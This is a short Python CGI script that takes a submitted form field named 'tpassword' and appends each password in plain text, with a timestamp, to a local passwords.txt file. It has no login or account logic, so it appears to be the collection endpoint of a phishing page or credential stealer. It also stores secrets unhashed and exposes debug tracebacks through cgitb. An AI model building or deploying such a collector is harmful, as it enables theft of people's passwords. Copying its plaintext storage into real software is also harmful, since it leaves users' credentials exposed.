import cgi
import cgitb
import datetime

cgitb.enable()

data = cgi.FieldStorage()
passwordFile = open("passwords.txt", "a")

time = str(datetime.datetime.now())
if "tpassword" in data:
    passwordFile.write("Password sent at " + time + ": " + data["tpassword"].value + "\n")
    print("success")
else:
    passwordFile.write("Invalid attempt at " + time + "\n")

passwordFile.close()
